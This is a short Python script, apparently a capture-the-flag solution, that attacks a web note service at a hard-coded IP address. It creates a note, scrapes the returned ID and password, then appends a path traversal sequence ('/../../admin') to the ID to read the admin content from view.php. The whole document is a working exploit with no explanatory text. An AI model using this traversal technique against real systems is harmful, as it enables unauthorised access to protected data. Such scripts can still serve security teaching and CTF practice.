import requests

host = "http://35.207.132.47:90/"
note = "Note"
note_data = {"note": note, "submit": "submit"}
note_request = requests.post(host, data=note_data)
txt = note_request.text
note_id = txt.split("ID is ")[1].split('<')[0]
note_pw = txt.split("PW is ")[1].split('<')[0]

note_id += "/../../admin"
flag_params = {"id": note_id, "pw": note_pw}
flag_request = requests.get(host + "view.php", params=flag_params)
flag = flag_request.text.strip()
print(flag)
